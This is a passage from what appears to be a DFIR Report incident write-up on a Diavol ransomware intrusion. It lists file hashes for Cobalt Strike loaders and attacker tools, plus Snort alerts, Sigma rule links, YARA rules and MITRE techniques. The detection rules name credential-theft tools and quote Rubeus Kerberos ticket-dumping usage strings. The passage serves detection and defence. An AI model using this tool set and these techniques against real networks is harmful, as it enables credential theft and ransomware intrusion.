SharedFiles.dll
fb88f4d22f14ca09ddeeca5d312f4d9f
<span class="hljs-number">734205</span>a694689db504418101b91c9981e3a12deb
c17e71c7ae15fdb02a4e22df4f50fb44215211755effd6e3fc56e7f3e586b299

Cobalt Strike
uvvfvnnswte.dll
<span class="hljs-number">69</span>c68c62844966115c13dfee2e7bc58c
<span class="hljs-number">7f</span>49ecaebe1c59c09587cee25fb8844c78a78665
<span class="hljs-number">5551f</span>b5702220dfc05e0811b7c91e149c21ec01e8ca210d1602e32dece1e464d

tmp.dll
<span class="hljs-number">56</span>c552097559ecbafedd5683038ca480
dc0699b1d1c5a99b75334b69dafce5fe86bcf6a3
<span class="hljs-number">493</span>a1fbe833c419b37bb345f6f193517d5d9fd2577f09cc74b48b49d7d732a54

Tools
AdFind.exe
<span class="hljs-number">9</span>b02dd2a1a15e94922be3f85129083ac
<span class="hljs-number">2</span>cb6ff75b38a3f24f3b60a2742b6f4d6027f0f2a  
b1102ed4bca6dae6f2f498ade2f73f76af527fa803f0e0b46e100d4cf5150682

Rubeus.exe
<span class="hljs-number">6798f</span>f540f3d077c3cda2f5a4a8559f7
<span class="hljs-number">40e8</span>b04603f168b034c322be6c8b0afa5a9e89ac
<span class="hljs-number">0e09068581</span>f6ed53d15d34fff9940dfc7ad224e3ce38ac8d1ca1057aee3e3feb

fodhelper_reg_hashes.bat
<span class="hljs-number">1e81900</span>cc66fde050aef4c3149f1a375
f334b1b95f315f994c82da572e7acb68df4b17ed
<span class="hljs-number">9809</span>bc0bea9bbfe31d47210391b124a724288b061d44dee5edc5e2582e36b271

MSSQLUDPScanner.exe
e6bef068c93cacdae7f15eded63461da
<span class="hljs-number">0390</span>eacb29a580adf9870dbd3412f91d984a3197
bc88ae2c3353ee858a0dcdcd087bcd55f3c7eab0c702f7b295d2836565073730

veeam1.cs.exe
<span class="hljs-number">32</span>d6f85c93bad9fa0f3eda1a8e80016
<span class="hljs-number">6e7628</span>cd11dc76835e8cc0b2a91dc38101fcdb90
<span class="hljs-number">07f</span>4a329f280d2896e1211ea79c73132be3a44e6c88819dea194e582bac18b3d

AnyDesk.exe
bd1c7369830ebd781ed5eade64f8f9e4
<span class="hljs-number">4f</span>65118960bd8bcc744d62e6f464f8bc82c85a9e
<span class="hljs-number">4</span>a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7

FileZillaPortable.exe
b56f93850ad1ba921d56fbfc0f6950ca
<span class="hljs-number">6</span>bb01635f68264afb77268dedd4e3ca3125e8c37
<span class="hljs-number">3</span>c53ccee435994cd8125be4ba09cd47dd64a3ffac00cce49327851541c50620
</code></pre>
<h3 id="detections">Detections</h3>
<h4 id="network">Network</h4>
<h4>Snort:</h4>
<pre><code>ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)
ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
ET POLICY PE EXE <span class="hljs-keyword">or</span> DLL Windows file download HTTP
ET INFO Packed Executable Download
[1:2850280:1] ETPRO TROJAN Observed Malicious SSL Cert (BazaLoader CnC) [Classification: A Network Trojan was Detected] [Priority: 1] {TCP}</code></pre>
<h4 id="sigma">Sigma</h4>
<p><a href="https://gist.github.com/0xThiebaut/66d68ada73e22d45b3ca80fea6ee2922" target="_blank" rel="noopener">Rule</a> generated by <a href="https://twitter.com/0xThiebaut" target="_blank" rel="noopener">@0xThiebaut</a>&#8216;s <a href="https://github.com/0xThiebaut/sigmai" target="_blank" rel="noopener">sigmai</a> project</p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_ad_find_discovery.yml" target="_blank" rel="noopener">AdFind Usage Detection</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_grabbing_sensitive_hives_via_reg.yml" target="_blank" rel="noopener">Grabbing Sensitive Hives via Reg Utility</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_access/sysmon_cred_dump_lsass_access.yml" target="_blank" rel="noopener">Credentials Dumping Tools Accessing LSASS Memory</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/f69868b5aa25f33c629208d8868994ed24b20b46/rules/windows/process_creation/win_susp_recon_activity.yml" target="_blank" rel="noopener">Suspicious Reconnaissance Activity</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/eb406ba36fc607986970c09e53058af412093647/rules/windows/process_creation/win_service_stop.yml" target="_blank" rel="noopener">Stop Windows Service</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/dd2aa8706dac60e49cbf73a176a72061822fa8cf/rules/windows/process_creation/win_anydesk_silent_install.yml" target="_blank" rel="noopener">AnyDesk Silent Installation</a></p>
<p><a href="https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_hack_rubeus.yml" target="_blank" rel="noopener">Rubeus Hack Tool</a></p>
<p>&nbsp;</p>
<h4 id="yara">Yara</h4>
<pre><code>/*
   YARA Rule Set
   Author: The DFIR Report
   Date: 2021-12-12
   Identifier: files
   Reference: 8099 https://thedfirreport.com
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule uvvfvnnswte {
   meta:
      description = "8099 - file uvvfvnnswte.dll"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "5551fb5702220dfc05e0811b7c91e149c21ec01e8ca210d1602e32dece1e464d"
   strings:
      $s1 = "(s#u%x0m(m#n&amp;y*r$o&amp;k\"j*o$y&amp;x\"k)l#k%y!l)y#u%j0m%v0w)w.n%k0q)l.o&amp;p/s*m-p&amp;u/m*v.q+j%o&amp;s%r+w%y&amp;p%s,t&amp;k%q&amp;t,q&amp;u%r'u,n%w%o%v,s%q%t%w" ascii
      $s2 = "0w(r#v%l0j(l$u\"o*u$n&amp;p\"v*p$x&amp;k!q)k#j%r!x)v#t,y.k%y0v)t.r%l0p)w-m&amp;o/r*n-t&amp;r/l)m%w+m%n&amp;x%n+x%x&amp;s&amp;y,s&amp;j%j&amp;p,n&amp;t(q%s,q%v%l%j,t%p%o" ascii
      $s3 = "%r0v(y#p%k0k'w&amp;m\"p*t$m&amp;v\"y*q$k%w!n)j#q%l!w)w.o)y.l%x0u)j.u%m0s*k-j&amp;n/y*x-s&amp;s0w&amp;u%x+l%m&amp;n%q+y%k%o&amp;v,r&amp;q%t&amp;o,o'o%q%t,p%u%r%m,u%s" ascii
      $s4 = "#t%s0u(j#o%j/x$p&amp;j\"q*w$v&amp;y\"x*r#l%x!o)q#r%k!v(l0x)v.m%s0n)m.t%v/t*l-k&amp;m/j*w-r%p%p&amp;r%y+o%v&amp;q%p+j&amp;l%p&amp;w,y&amp;r%s&amp;n)t%x%n%u,k%n%u%l,n" ascii
      $s5 = "#s+r+y+x/o#k,q$l$t%q0x$u.s*j,s0l(r&amp;r,u0y*p%s!y-y%v'l&amp;v%l%o-q+o%s!k-m)l!p-n!r(q(l.t)p\"o+s%k&amp;v'j*v#w&amp;y/n&amp;q&amp;w&amp;v'm)s\"r#n/v*w/j*l\"" ascii
      $s6 = "%y&amp;u&amp;x!s%k%t%j%m\"p&amp;m&amp;k%o%n\"m%l&amp;v%t%s\"r%q&amp;u%y,l/o)u+p0q)y)p)q)r-y)m+x-o,u,t/u*s,n+l+k0j,t,m+q+t0w,o,x+v+y0t,y)o*k*j-q*x)j*p*o-" ascii
      $s7 = "-r#u&amp;p.w+l#r,o%w%x%y$n%y-j,u$y(y,s,r,y$w%n-n%v-q)l%l%q%p-r!o/n+k\"r,q)q#r!s(o%l#p&amp;s\"r.n*q&amp;q.k*u#y+s\"j(n*o\"o)w*t)s%k#r/l,w#w'u" ascii
      $s8 = ",j/j#t(v+l#s.s%w%x%y0x$o%v%u-x,j0t$j/m+n%l$k!k\"l+t-q!p-x&amp;y+v/l%q%s%r0n'v%w%v&amp;m,u$w+y+r+s*s*r*q*p*o*n*m*l*k*j+y+x+w+v+u+t+s!l!w'" ascii
      $s9 = ",n0m%s$s(j0n(q#m*v0p.x0q't0w)v)x)y/m-s(y%o&amp;m%n,w0t/l#x(r*k+p)k%p0k,v(k$w!t%j*w#x,k(o!y%y#w,j\"l&amp;s(w%r!n*t0l0p%v#y+p+s)q%o%p$m'j0" ascii
      $s10 = "(l/j#l0u$t/n$x0y!p0n$v(k&amp;w,p,t,t,s$w(y-u*u!o,q%m%k%j,r&amp;m0l.s%t%t,p)u-v,o&amp;s$j)s+w%n0l-t&amp;q&amp;o/w%y&amp;t&amp;s&amp;r.n)x,o)t.p*w*x)u%y/m*m\"j'j#" ascii
      $s11 = "/k#u'u)x0l'y(y0t$l&amp;v*y%s+j$t#p,t,s$w(y-u,o%m&amp;p0p.w%j%q+w%q(q)u-y)s$v%m-o)o+n!l-t+x+y.n*x+t,y&amp;s's*s\"j.v*t(o*y+y#t/l)v%y&amp;o,q*u(x$" ascii
      $s12 = "&amp;q+v.s)m/v#y%w,q,x$o/q,q,o,n,n!n0n.y0u$o%t%m)t%w-o%p%p%p%o,u)l%o-v(k%x%x%w)u\"p)o+x+x&amp;q&amp;p,v+u&amp;u&amp;t&amp;s.m&amp;n\"u.p*u&amp;j,j)s0p+o*s*t#v/x" ascii
      $s13 = "+s+r/q*o*j0l,y,j,k-n+w0x$r,k.x,p,u,r0q)o%o-r%w-k(x%j$l%y!w-y)n+l$p\"q%y%x.w0o&amp;y&amp;l&amp;k&amp;j,y0x%q&amp;n&amp;u\"l.l*m,q)x*y+m*v#t/t$v%m&amp;x#w/q+y" ascii
      $s14 = "+s%j/t)s+w+v(y!u,j,j,q,p&amp;w)x*v,t,s(n(m0p$p,s,x+p%m%j)n!x-x%k,p+x%u%r!m#w)y!k&amp;j*l\"m&amp;y%q&amp;l*o\"v.j*u+t&amp;q#j&amp;y*x*j+y#t/l)v&amp;y/w,n#v/p" ascii
      $s15 = "/v*u'y*w(y*y(t&amp;t-x%y%r%s0w$q(y)l(t(n(m0p$x&amp;j'u0u&amp;p%j%q%p+w\"n)l%t%s-w)y$t%t0o&amp;p&amp;l&amp;k&amp;j*t(y\"n/v&amp;t&amp;t&amp;s&amp;r/o%s&amp;s&amp;v+m#m/v#r'p)x#t*t*n" ascii
      $s16 = "'s%k/m&amp;k&amp;l&amp;m0u$s(m0s*n(n0v)y(r-w,y%u,j.k,y&amp;q'r!t-t)t%r\"k)o!o0l&amp;t%s%r%y!x-q*u$o&amp;w#l)r&amp;p&amp;s/u*p$w&amp;o'm(r*y&amp;k.s)x\"q'q#s*y+p/v(n#w*n" ascii
      $s17 = "\"k+m+y+x+w'y(y0t$l&amp;v*y0t$x(w$j0m-s&amp;j(l%k%l%m-p)l$n&amp;p!x#o!n$n!q-q&amp;v\"t%j%t%w!o.r*u\"s*k,q&amp;k\"q+u%y%t\"k.u*u(p*x*j+y#t/r$v%m'x#w/" ascii
      $s18 = "(k%m+w*w(p#s'r-p+n&amp;r0t-o%t%u$l+l&amp;k!x-v%k%l(u%m%u%k%j%q-o)x,u-j)o+k't,j,k,l-q*j,s%l,r-t#o+t+u*v&amp;t&amp;j&amp;r&amp;y&amp;x,o/p\"t*w*x/m+y*s#w/y$q%" ascii
      $s19 = "$t#j/v)l%w#n0j!u'k(j$y0w+v!j%r%s,j%k(n!j's%y.k%t)t%m\"q0s-n)q#y!r!s%j)l&amp;v!s$q\"r'x0y&amp;r*v&amp;w!o0v)x!v\"r\"r&amp;q*w(x!v#m+k!l#j+n%o#k#n" ascii
      $s20 = "#t%n)y/q#p(n$r%j0r)u(y-l+o0v$j's&amp;k)t&amp;q%k%l$s)m%w-n0l%q%p%o0v.r'x!j.t,r+j-j(j%o.s%l*k+r&amp;l+t*p.j*w*r,j%j&amp;w+o&amp;y,n&amp;u$l'n\"t(p#w/y+j)" ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 2000KB and
      ( pe.imphash() == "1a4ea0d6f08424c00bbeb4790cdf1ca7" and ( pe.exports("GhlqallxvchxEpmvydvyzqt") and pe.exports("PyflzyhnwVkaNixwdqktzn") ) or 8 of them )
}

rule files_Rubeus {
   meta:
      description = "8099 - file Rubeus.exe"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "0e09068581f6ed53d15d34fff9940dfc7ad224e3ce38ac8d1ca1057aee3e3feb"
   strings:
      $x1 = "        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]" fullword wide
      $x2 = "        Rubeus.exe asktgt /user:USER &lt;/password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH" wide
      $x3 = "[!] GetSystem() - OpenProcessToken failed!" fullword wide
      $x4 = "        Rubeus.exe createnetonly /program:\"C:\\Windows\\System32\\cmd.exe\" [/show]" fullword wide
      $x5 = "[!] GetSystem() - ImpersonateLoggedOnUser failed!" fullword wide
      $x6 = "[X] You need to have an elevated context to dump other users' Kerberos tickets :( " fullword wide
      $x7 = "[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'" fullword wide
      $x8 = "    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:" fullword wide
      $s9 = "Z:\\Agressor\\github.com-GhostPack\\Rubeus-master\\Rubeus\\obj\\Debug\\Rubeus.pdb" fullword ascii
      $s10 = "    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:" fullword wide
      $s11 = "[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi" fullword wide
      $s12 = "Action: Dump Kerberos Ticket Data (All Users)" fullword wide
      $s13 = "[*] Initializing Kerberos GSS-API w/ fake delegation for target '{0}'" fullword wide
      $s14 = "[*] Listing statistics about target users, no ticket requests being performed." fullword wide
      $s15 = "[X] OpenProcessToken error: {0}" fullword wide
      $s16 = "[X] CreateProcessWithLogonW error: {0}" fullword wide
      $s17 = "[*] Target service  : {0:x}" fullword wide
      $s18 = "[*] Target Users           : {0}" fullword wide
      $s19 = "        Rubeus.exe s4u /user:USER &lt;/rc4:HASH | /aes256:HASH&gt; [/domain:DOMAIN] &lt;/impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.K" wide
      $s20 = "    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:" fullword wide
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 700KB and
      1 of ($x*) and 4 of them
}

rule SharedFiles {
   meta:
      description = "8099 - file SharedFiles.dll"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "c17e71c7ae15fdb02a4e22df4f50fb44215211755effd6e3fc56e7f3e586b299"
   strings:
      $s1 = "ButtonSkin.dll" fullword wide
      $s2 = "MyLinks.dll" fullword wide
      $s3 = "DragListCtrl.dll" fullword ascii
      $s4 = "whoami.exe" fullword ascii
      $s5 = "constructor or from DllMain." fullword ascii
      $s6 = "DINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii
      $s7 = "kLV -{T" fullword ascii
      $s8 = "CtrlList1" fullword wide
      $s9 = "CtrlList2" fullword wide
      $s10 = "CtrlList3" fullword wide
      $s11 = "wox)YytbACl_&lt;me*y3X(*lNCvY@8jsbePLfVHH!X2p2TdHa6+1hoo^1N7gNtwhki)Lbaso@*ne7" fullword ascii
      $s12 = "QX[gbL" fullword ascii /* Goodware String - occured 1 times */
      $s13 = "BasicScore" fullword ascii
      $s14 = ".?AVCDemoDlg@@" fullword ascii
      $s15 = "jLDfSektRC2FrOiWNzhbH3AsmBEIwg1U" fullword ascii
      $s16 = "9t$xt5" fullword ascii /* Goodware String - occured 1 times */
      $s17 = "DeAj1=n" fullword ascii
      $s18 = "WmaK|IG" fullword ascii
      $s19 = "oTRHz`R" fullword ascii
      $s20 = "VWATAUAVAWLc" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 2000KB and
      ( pe.imphash() == "c270086ea8ef591ab09b6ccf85dc6072" and pe.exports("BasicScore") or 8 of them )
}

rule new_documents_2005_iso {
   meta:
      description = "8099 - file new-documents-2005.iso"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-11-29"
      hash1 = "1de1336e311ba4ab44828420b4f876d173634670c0b240c6cca5babb1d8b0723"
   strings:
      $x1 = "SharedFiles.dll,BasicScore\"%systemroot%\\system32\\imageres.dll" fullword wide
      $s2 = "C:\\Windows\\System32\\rundll32.exe" fullword ascii
      $s3 = "SHAREDFI.DLL" fullword ascii
      $s4 = "SharedFiles.dll" fullword wide
      $s5 = "C:\\Users\\User\\Documents" fullword wide
      $s6 = "DragListCtrl.dll" fullword ascii
      $s7 = "MyLinks.dll" fullword wide
      $s8 = "ButtonSkin.dll" fullword wide
      $s9 = "whoami.exe" fullword ascii
      $s10 = " ..\\Windows\\System32\\rundll32.exe" fullword wide
      $s11 = "User (C:\\Users)" fullword wide
      $s12 = "        " fullword ascii
      $s13 = "DOCUMENT.LNK" fullword ascii
      $s14 = "Documents.lnk@" fullword wide
      $s15 = ",System32" fullword wide
      $s16 = " Type Descriptor'" fullword ascii
      $s17 = " constructor or from DllMain." fullword ascii
      $s18 = "  " fullword ascii
      $s19 = "DINGXXPADDINGPADDINGXXPADDINGPADD" fullword ascii
      $s20 = " Class Hierarchy Descriptor'" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize &lt; 2000KB and
      1 of ($x*) and 4 of them
}

rule files_tmp {
   meta:
      description = "8099 - file tmp.dll"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "493a1fbe833c419b37bb345f6f193517d5d9fd2577f09cc74b48b49d7d732a54"
   strings:
      $s1 = "UncategorizedOtherOutOfMemoryUnexpectedEofInterruptedArgumentListTooLongFilenameTooLongTooManyLinksCrossesDevicesDeadlockExecuta" ascii
      $s2 = "uncategorized errorother errorout of memoryunexpected end of fileunsupportedoperation interruptedargument list too longfilename " ascii
      $s3 = "kuiiqaiusmlytqxxnrtl.dll" fullword ascii
      $s4 = "Node.js API crypto.randomFillSync is unavailableNode.js crypto module is unavailablerandSecure: VxWorks RNG module is not initia" ascii
      $s5 = "ctoryoperation would blockentity already existsbroken pipenetwork downaddress not availableaddress in usenot connectedconnection" ascii
      $s6 = "AppPolicyGetProcessTerminationMethod" fullword ascii
      $s7 = "keyed events not availableC:rtzkoqhrehbskobagkzngetniywbivatkcfmkxxumjxevfohiuxtzrkjoopvcwassaovngxtdmzbhlhkgasumqlldyupsmjyztrd" ascii
      $s8 = "keyed events not availableC:rtzkoqhrehbskobagkzngetniywbivatkcfmkxxumjxevfohiuxtzrkjoopvcwassaovngxtdmzbhlhkgasumqlldyupsmjyztrd" ascii
      $s9 = "attempted to index slice from after maximum usizeattempted to index slice up to maximum usizeassertion failed: mid &lt;= self.len()" ascii
      $s10 = "attempted to zero-initialize type `alloc::string::String`, which is invalidassertion failed: 0 &lt; pointee_size &amp;&amp; pointee_size &lt;=" ascii
      $s11 = "attempted to zero-initialize type `&amp;str`, which is invalidassertion failed: 0 &lt; pointee_size &amp;&amp; pointee_size &lt;= isize::MAX as us" ascii
      $s12 = "attempted to zero-initialize type `&amp;str`, which is invalidassertion failed: 0 &lt; pointee_size &amp;&amp; pointee_size &lt;= isize::MAX as us" ascii
      $s13 = "rno: did not return a positive valuegetrandom: this target is not supportedC:ehpgbcedommleqfhulhfnkiqvffztwzvxtvorsmuwrtkmtsqdfl" ascii
      $s14 = "attempted to zero-initialize type `(*mut u8, unsafe extern \"C\" fn(*mut u8))`, which is invalidassertion failed: 0 &lt; pointee_si" ascii
      $s15 = "attempted to index slice from after maximum usizeattempted to index slice up to maximum usizeassertion failed: mid &lt;= self.len()" ascii
      $s16 = "attempted to zero-initialize type `alloc::string::String`, which is invalidassertion failed: 0 &lt; pointee_size &amp;&amp; pointee_size &lt;=" ascii
      $s17 = "workFileHandleFilesystemLoopReadOnlyFilesystemDirectoryNotEmptyIsADirectoryNotADirectoryWouldBlockAlreadyExistsBrokenPipeNetwork" ascii
      $s18 = "abortednetwork unreachablehost unreachableconnection resetconnection refusedpermission deniedentity not foundErrorkind" fullword ascii
      $s19 = "thread panicked while processing panic. aborting." fullword ascii
      $s20 = "internal_codedescription0" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize &lt; 5000KB and
      ( pe.imphash() == "59e16a2afa5b682bb9692bac873fa10c" and ( pe.exports("EnterDll") and pe.exports("alpjxriee") and pe.exports("arcfqsbobtwbjrf") and pe.exports("asblsmvdudmlwht") and pe.exports("bgttsajxwgwrsai") and pe.exports("bosaplw") ) or 8 of them )
}

rule Documents {
   meta:
      description = "8099 - file Documents.lnk"
      author = "The DFIR Report"
      reference = "https://thedfirreport.com"
      date = "2021-12-12"
      hash1 = "e87f9f378590b95de1b1ef2aaab84e1d00f210fd6aaf5025d815f33096c9d162"
   strings:
      $x1 = "SharedFiles.dll,BasicScore\"%systemroot%\\system32\\imageres.dll" fullword wide
      $x2 = "C:\\Windows\\System32\\rundll32.exe" fullword ascii
      $s3 = "C:\\Users\\User\\Documents" fullword wide
      $s4 = " ..\\Windows\\System32\\rundll32.exe" fullword wide
      $s5 = "User (C:\\Users)" fullword wide
      $s6 = ",System32" fullword wide
      $s7 = "Documents" fullword wide /* Goodware String - occured 89 times */
      $s8 = "windev2106eval" fullword ascii
      $s9 = "%Windows" fullword wide /* Goodware String - occured 2 times */
      $s10 = "OwHUSx" fullword ascii
      $s11 = "System Folder" fullword wide /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x004c and filesize &lt; 3KB and
      1 of ($x*) and all of them
}

</code></pre>
<h4 id="mitre">MITRE</h4>
<ul>
<li>Spearphising Link &#8211; T1566.002</li>
<li>BITS Jobs &#8211; T1197</li>
<li>Kerberoasting &#8211; T1558.003</li>
<li>AS-REP Roasting &#8211; T1558.004</li>
<li>Credentials in Registry &#8211; T1552.002</li>
<li>Remote Desktop Protocol &#8211; T1021.001</li>
<li>Exfiltration to Cloud Storage &#8211; T1567.002</li>
<li>OS Credential Dumping – T1003</li>
<li>SMB/Windows Admin Shares – T1021.002</li>
<li>System Owner/User Discovery – T1033</li>
<li>Network Service Scanning – T1046</li>
<li>Process Injection – T1055</li>
<li>PowerShell – T1059.001</li>
<li>Domain Groups – T1069.002</li>
<li>File and Directory Discovery – T1083</li>
<li>Access Token Manipulation – T1134</li>
<li>Network Share Discovery – T1135</li>
<li>Domain Trust Discovery – T1482</li>
<li>Data Encrypted for Impact – T1486</li>
<li>Disable or Modify Tools – T1562.001</li>
<li>Valid Accounts &#8211; T1078</li>
</ul>
<p>Internal case #8099</p>
</div>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-4874" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2021/12/13/diavol-ransomware/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-4874" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2021/12/13/diavol-ransomware/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2021/12/13/diavol-ransomware/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-4874" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2021/12/13/diavol-ransomware/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2021/12/13/diavol-ransomware/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/" rel="prev">CONTInuing the Bazar Ransomware Story</a></div><div class="nav-next"><a href="https://thedfirreport.com/2022/01/24/cobalt-strike-a-defenders-guide-part-2/" rel="next">Cobalt Strike, a Defender’s Guide &#8211; Part 2</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2021/12/13/diavol-ransomware/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2021/12/13/diavol-ransomware/" /><input type="hidden" name="post_id" value="4874" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
